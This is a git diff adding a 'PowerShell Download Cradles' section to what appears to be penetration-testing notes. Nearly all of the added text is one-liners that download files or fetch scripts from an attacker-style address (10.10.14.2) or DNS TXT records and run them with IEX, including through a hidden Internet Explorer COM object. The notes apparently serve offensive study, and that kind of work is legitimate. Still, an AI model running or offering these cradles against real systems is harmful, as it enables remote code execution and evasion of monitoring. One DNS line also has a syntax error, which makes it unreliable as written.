@@ -643,7 +643,46 @@ Get-EventLog 'Windows PowerShell' -EntryType Information -InstanceId 800
 
 ![](../.gitbook/assets/powershell\_event\_logging.JPG)
 
+## Powershell Download Cradles
 
+There are multiple ways to download files using PowerShell, including the following:
+
+#### System.Net.WebClient:
+
+```powershell
+(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
+```
+
+#### Invoke-WebRequest:
+
+```powershell
+Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
+```
+
+#### Hidden IE com object:
+
+```powershell
+$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://10.10.14.2/code.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
+```
+
+#### Msxml2.XMLHTTP COM object:
+
+```powershell
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.2/code.ps1',$false);$h.send();iex $h.responseText
+```
+
+#### WinHttp COM object (not proxy aware):
+
+```powershell
+$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.14.2/code.ps1',$false);$h.send();iex $h.responseText
+```
+
+#### DNS download cradle:
+
+```powershell
+$m=(-join (resolve-dnsname -type txt txt.domain.here).strings); iex (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m))))
+$z='';$n=1..2;ForEach ($i in $n) { $z += ((resolve-dnsname -type txt $icrapdomain.org).strings) }; iex((System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($z))))
+```
 
 
 
